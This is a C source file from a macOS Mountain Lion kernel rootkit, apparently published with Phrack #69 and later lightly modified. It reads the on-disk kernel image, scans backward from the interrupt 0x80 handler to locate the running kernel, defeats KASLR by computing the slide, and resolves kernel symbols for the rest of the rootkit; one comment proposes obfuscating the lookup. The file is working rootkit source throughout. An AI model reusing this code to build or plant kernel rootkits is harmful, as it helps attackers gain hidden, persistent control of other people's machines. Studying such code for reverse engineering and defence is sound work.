/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * kernel_info.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "kernel_info.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <sys/vnode.h>
#include <string.h>
#include <sys/attr.h>
#include <mach-o/nlist.h>
#include <mach-o/loader.h>

#include "uio.h"
#include "proc.h"
#include "idt.h"
#include "configuration.h"

static kern_return_t get_kernel_mach_header(void *buffer, vnode_t kernel_vnode, vfs_context_t vfs);
static kern_return_t process_kernel_mach_header(void *kernel_header, struct kernel_info *kinfo);
static kern_return_t get_kernel_linkedit(vnode_t kernel_vnode, vfs_context_t vfs, struct kernel_info *kinfo);
static mach_vm_address_t calculate_int80address(const mach_vm_address_t idt_address);
static void get_running_text_address(struct kernel_info *kinfo);
static mach_vm_address_t find_kernel_base(const mach_vm_address_t int80_address);

# pragma mark Exported functions

/*
 * entrypoint function to read necessary information from running kernel and kernel at disk
 * such as kaslr slide, linkedit location
 * the reads from disk are implemented using the available KPI VFS functions
 */
kern_return_t
init_kernel_info(struct kernel_info *kinfo)
{
    //moony_modify//printf("[DEBUG] init_kernel_info entered:\n");
    kern_return_t error = 0;
    // lookup vnode for /mach_kernel
    vnode_t kernel_vnode = NULLVP;
    vfs_context_t vfs = NULL;
    if ((vfs = vfs_context_create(NULL)) == NULL)
    {
        //moony_modify//printf("[DEBUG] failed vfs_context_create \n");
        return KERN_FAILURE;
    }
    error = vnode_lookup(MACH_KERNEL, 0, &kernel_vnode, vfs);
    if (error)
    {
        //moony_modify//printf("[DEBUG] failed vnode_lookup [%s], error code= 0x%llx\n",MACH_KERNEL,error);
        return KERN_FAILURE;
    }
    //moony_modify//printf("[DEBUG] kernel [%s]as vnode 0x%llx, vfs 0x%llx\n",MACH_KERNEL,kernel_vnode,vfs);
    void *kernel_header = _MALLOC(PAGE_SIZE_64, M_TEMP, M_ZERO);
    if (kernel_header == NULL) return KERN_FAILURE;
    
    // read and process kernel header from filesystem
    error = get_kernel_mach_header(kernel_header, kernel_vnode, vfs);
    if (error) goto failure;
    error = process_kernel_mach_header(kernel_header, kinfo);
    if (error) goto failure;
    
    // compute kaslr slide
    get_running_text_address(kinfo);
    kinfo->kaslr_slide = kinfo->running_text_addr - kinfo->disk_text_addr;
#if DEBUG
    //moony_modify//printf("[DEBUG] kernel aslr slide is %llx\n", kinfo->kaslr_slide);
#endif
    // we know the location of linkedit and offsets into symbols and their strings
    // now we need to read linkedit into a buffer so we can process it later
    // __LINKEDIT total size is around 1MB
    // we should free this buffer later when we don't need anymore to solve symbols
    kinfo->linkedit_buf = _MALLOC(kinfo->linkedit_size, M_TEMP, M_ZERO);
    if (kinfo->linkedit_buf == NULL)
    {
        _FREE(kernel_header, M_TEMP);
        return KERN_FAILURE;
    }
    // read linkedit from filesystem
    error = get_kernel_linkedit(kernel_vnode,vfs, kinfo);
    if (error) goto failure;

success:
    if (vfs)
    {
        vfs_context_rele(vfs);
    }
    _FREE(kernel_header, M_TEMP);
    // drop the iocount due to vnode_lookup()
    // we must do this else machine will block on shutdown/reboot
    vnode_put(kernel_vnode);
    return KERN_SUCCESS;

failure:
    if (vfs)
    {
        vfs_context_rele(vfs);
    }
    if (kinfo->linkedit_buf != NULL) _FREE(kinfo->linkedit_buf, M_TEMP);
    _FREE(kernel_header, M_TEMP);
    vnode_put(kernel_vnode);
    return KERN_FAILURE;
}

/*
 * cleanup the kernel info buffer to avoid memory leak.
 * there's nothing else to cleanup here, for now
 */
kern_return_t
cleanup_kernel_info(struct kernel_info *kinfo)
{
    if (kinfo->linkedit_buf != NULL)
    {
        _FREE(kinfo->linkedit_buf, M_TEMP);
        kinfo->linkedit_buf = NULL;
    }
    return KERN_SUCCESS;
}

/*
 * function to solve a kernel symbol
 */
mach_vm_address_t
//uint64_t
//unsigned long long
solve_kernel_symbol(struct kernel_info *kinfo, char *symbol_to_solve)
{
    struct nlist_64 *nlist = NULL;
    mach_vm_address_t  uValue = 0;

    if (kinfo == NULL || kinfo->linkedit_buf == NULL) return 0;

    // symbols and strings offsets into LINKEDIT
    // we just read the __LINKEDIT but fileoff values are relative to the full /mach_kernel
    // subtract the base of LINKEDIT to fix the value into our buffer
    mach_vm_address_t symbol_off = kinfo->symboltable_fileoff - kinfo->linkedit_fileoff;
    mach_vm_address_t string_off = kinfo->stringtable_fileoff - kinfo->linkedit_fileoff;
    // search for the symbol and get its location if found
    for (uint32_t i = 0; i < kinfo->symboltable_nr_symbols; i++)
    {
        // get the pointer to the symbol entry and extract its symbol string
        nlist = (struct nlist_64*)((char*)kinfo->linkedit_buf + symbol_off + i * sizeof(struct nlist_64));
        char *symbol_string = ((char*)kinfo->linkedit_buf + string_off + nlist->n_un.n_strx);
        // find if symbol matches
        // XXX: we could obfuscate this and make it faster with some hash algo
        //kernel_print_log(symbol_string);
        if (strncmp(symbol_to_solve, symbol_string, strlen(symbol_to_solve)) == 0
            && strncmp(symbol_string, symbol_to_solve, strlen(symbol_string)) == 0)
        {
            
            uValue  = nlist->n_value + kinfo->kaslr_slide;
            //__asm__ volatile ("int3");
#if 0
            //moony_modify//printf("[DEBUG] found symbol [%s] matched [%s] at %llx, value=0x%llx\n",
                   symbol_to_solve,
                   symbol_string,
                   nlist->n_value, uValue);
            
#endif
            //__asm__ volatile ("int3");
            // the symbols values are without kernel ASLR so we need to add it
            return ((unsigned long long)uValue);
        }
    }
    // failure
    return 0;
    
}

/*
 * return the address of the symbol after the one in the parameter
 * this is a cheap/not very reliable trick to find out the size of a given symbol
 * cheap because we might have static functions between the two symbols, for example
 */
mach_vm_address_t
solve_next_kernel_symbol(const struct kernel_info *kinfo, const char *symbol)
{
    struct nlist_64 *nlist = NULL;
    
    if (kinfo == NULL || kinfo->linkedit_buf == NULL) return 0;

    mach_vm_address_t symbol_off = kinfo->symboltable_fileoff - kinfo->linkedit_fileoff;
    mach_vm_address_t string_off = kinfo->stringtable_fileoff - kinfo->linkedit_fileoff;

    for (uint32_t i = 0; i < kinfo->symboltable_nr_symbols; i++)
    {
        nlist = (struct nlist_64*)((char*)kinfo->linkedit_buf + symbol_off + i * sizeof(struct nlist_64));
        char *symbol_string = ((char*)kinfo->linkedit_buf + string_off + nlist->n_un.n_strx);
        if (strncmp(symbol, symbol_string, strlen(symbol)) == 0)
        {
            // lookup the next symbol
            nlist = (struct nlist_64*)((char*)kinfo->linkedit_buf + symbol_off + (i+1) * sizeof(struct nlist_64));
            symbol_string = ((char*)kinfo->linkedit_buf + string_off + nlist->n_un.n_strx);
#if DEBUG
            //moony_modify//printf("[DEBUG] found next symbol %s at %llx (%s)\n", symbol, nlist->n_value, symbol_string);
#endif
            return (nlist->n_value + kinfo->kaslr_slide);
        }
    }
    // failure
    return 0;
}

#pragma mark Internal helper functions

/*
 * retrieve the first page of kernel binary at disk into a buffer
 * version that uses KPI VFS functions and a ripped uio_createwithbuffer() from XNU
 */
static kern_return_t
get_kernel_mach_header(void *buffer, vnode_t kernel_vnode, vfs_context_t vfs)
{
    int error = 0;

    uio_t uio = NULL;
//    char uio_buf[UIO_SIZEOF(1)];
//    uio = uio_createwithbuffer(1, 0, UIO_SYSSPACE, UIO_READ, &uio_buf[0], sizeof(uio_buf));
    uio = uio_create(1, 0, UIO_SYSSPACE, UIO_READ);
    if (uio == NULL) return KERN_FAILURE;
    // imitate the kernel and read a single page from the header
    error = uio_addiov(uio, CAST_USER_ADDR_T(buffer), PAGE_SIZE_64);
    if (error) return error;
    // read kernel vnode into the buffer
    error = VNOP_READ(kernel_vnode, uio, 0, vfs);
    
    if (error) return error;
    else if (uio_resid(uio)) return EINVAL;
    
    return KERN_SUCCESS;
}

/*
 * retrieve the whole linkedit segment into target buffer from kernel binary at disk
 * we keep this buffer until we don't need to solve symbols anymore
 */
static kern_return_t
get_kernel_linkedit(vnode_t kernel_vnode,vfs_context_t vfs, struct kernel_info *kinfo)
{
    int error = 0;
    uio_t uio = NULL;
//    char uio_buf[UIO_SIZEOF(1)];
//    uio = uio_createwithbuffer(1, kinfo->linkedit_fileoff, UIO_SYSSPACE, UIO_READ, &uio_buf[0], sizeof(uio_buf));
    uio = uio_create(1, kinfo->linkedit_fileoff, UIO_SYSSPACE, UIO_READ);
    if (uio == NULL) return KERN_FAILURE;
    error = uio_addiov(uio, CAST_USER_ADDR_T(kinfo->linkedit_buf), kinfo->linkedit_size);
    if (error) return error;
    error = VNOP_READ(kernel_vnode, uio, 0, vfs);
    
    if (error) return error;
    else if (uio_resid(uio)) return EINVAL;
    
    return KERN_SUCCESS;
}

/*
 * retrieve necessary mach-o header information from the kernel buffer
 * stored at our kernel_info structure
 */
static kern_return_t
process_kernel_mach_header(void *kernel_header, struct kernel_info *kinfo)
{
    struct mach_header_64 *mh = (struct mach_header_64*)kernel_header;
    // test if it's a valid mach-o header (or appears to be)
    if (mh->magic != MH_MAGIC_64) return KERN_FAILURE;
    
    struct load_command *load_cmd = NULL;
    // point to the first load command
    char *load_cmd_addr = (char*)kernel_header + sizeof(struct mach_header_64);
    // iterate over all load cmds and retrieve required info to solve symbols
    // __LINKEDIT location and symbol/string table location
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        load_cmd = (struct load_command*)load_cmd_addr;
        if (load_cmd->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *seg_cmd = (struct segment_command_64*)load_cmd;
            // use this one to retrieve the original vm address of __TEXT so we can compute kernel aslr slide
            if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
            {
                kinfo->disk_text_addr = seg_cmd->vmaddr;
                // lookup the __text section - we want the size which can be retrieve here or from the running version
                char *section_addr = load_cmd_addr + sizeof(struct segment_command_64);
                struct section_64 *section_cmd = NULL;
                // iterate thru all sections
                for (uint32_t x = 0; x < seg_cmd->nsects; x++)
                {
                    section_cmd = (struct section_64*)section_addr;
                    if (strncmp(section_cmd->sectname, "__text", 16) == 0)
                    {
                        kinfo->text_size = section_cmd->size;
                        break;
                    }
                    section_addr += sizeof(struct section_64);
                }
            }
            else if (strncmp(seg_cmd->segname, "__LINKEDIT", 16) == 0)
            {
                kinfo->linkedit_fileoff = seg_cmd->fileoff;
                kinfo->linkedit_size    = seg_cmd->filesize;
            }
        }
        // table information available at LC_SYMTAB command
        else if (load_cmd->cmd == LC_SYMTAB)
        {
            struct symtab_command *symtab_cmd = (struct symtab_command*)load_cmd;
            kinfo->symboltable_fileoff    = symtab_cmd->symoff;
            kinfo->symboltable_nr_symbols = symtab_cmd->nsyms;
            kinfo->stringtable_fileoff    = symtab_cmd->stroff;
            kinfo->stringtable_size       = symtab_cmd->strsize;
        }
        load_cmd_addr += load_cmd->cmdsize;
    }
    return KERN_SUCCESS;
}

/*
 * retrieve the __TEXT address of current loaded kernel so we can compute the KASLR slide
 * also the size of __text 
 */
static void
get_running_text_address(struct kernel_info *kinfo)
{
    // retrieves the address of the IDT
    mach_vm_address_t idt_address = 0;
    get_addr_idt(&idt_address);
    // calculate the address of the int80 handler
    mach_vm_address_t int80_address = calculate_int80address(idt_address);
    // search backwards for the kernel base address (mach-o header)
    mach_vm_address_t kernel_base = find_kernel_base(int80_address);
    if (kernel_base != 0)
    {
        // get the vm address of __TEXT segment
        struct mach_header_64 *mh = (struct mach_header_64*)kernel_base;
        struct load_command *load_cmd = NULL;
        char *load_cmd_addr = (char*)kernel_base + sizeof(struct mach_header_64);        
        for (uint32_t i = 0; i < mh->ncmds; i++)
        {
            load_cmd = (struct load_command*)load_cmd_addr;
            if (load_cmd->cmd == LC_SEGMENT_64)
            {
                struct segment_command_64 *seg_cmd = (struct segment_command_64*)load_cmd;
                if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
                {
                    kinfo->running_text_addr = seg_cmd->vmaddr;
                    kinfo->mh = mh;
                    break;
                }
            }
            load_cmd_addr += load_cmd->cmdsize;
        }
    }
}

/*
 * calculate the address of the kernel int80 handler
 * using the IDT array
 */
static mach_vm_address_t
calculate_int80address(const mach_vm_address_t idt_address)
{
  	// find the address of interrupt 0x80 - EXCEP64_SPC_USR(0x80,hi64_unix_scall) @ osfmk/i386/idt64.s
	struct descriptor_idt *int80_descriptor;
	mach_vm_address_t int80_address;
    // we need to compute the address, it's not direct
    // extract the stub address
    // retrieve the descriptor for interrupt 0x80
    // the IDT is an array of descriptors
    int80_descriptor = (struct descriptor_idt*)(idt_address+sizeof(struct descriptor_idt)*0x80);
    uint64_t high = (unsigned long)int80_descriptor->offset_high << 32;
    uint32_t middle = (unsigned int)int80_descriptor->offset_middle << 16;
    int80_address = (mach_vm_address_t)(high + middle + int80_descriptor->offset_low);
#if DEBUG
	//moony_modify//printf("[DEBUG] Address of interrupt 80 stub is %llx\n", int80_address);
#endif
    return int80_address;
}

/*
 * find the kernel base address (mach-o header)
 * by searching backwards using the int80 handler as starting point
 */
static mach_vm_address_t
find_kernel_base(const mach_vm_address_t int80_address)
{
    mach_vm_address_t temp_address = int80_address;
    struct segment_command_64 *segment_command = NULL;
    
    while (temp_address > 0)
    {
        if (*(uint32_t*)(temp_address) == MH_MAGIC_64 && ((struct mach_header_64*)temp_address)->filetype == MH_EXECUTE)
        {
            // make sure it's the header and not some reference to the MAGIC number
            segment_command = (struct segment_command_64*)(temp_address + sizeof(struct mach_header_64));
            if (strncmp(segment_command->segname, "__TEXT", 16) == 0)
            {
#if DEBUG
                //moony_modify//printf("[DEBUG] Found running kernel mach-o header address at %p\n", (void*)(temp_address));
#endif
                return temp_address;
            }
        }
        // check for int overflow
        if (temp_address - 1 > temp_address) break;
        temp_address--;
    }
    return 0;
}
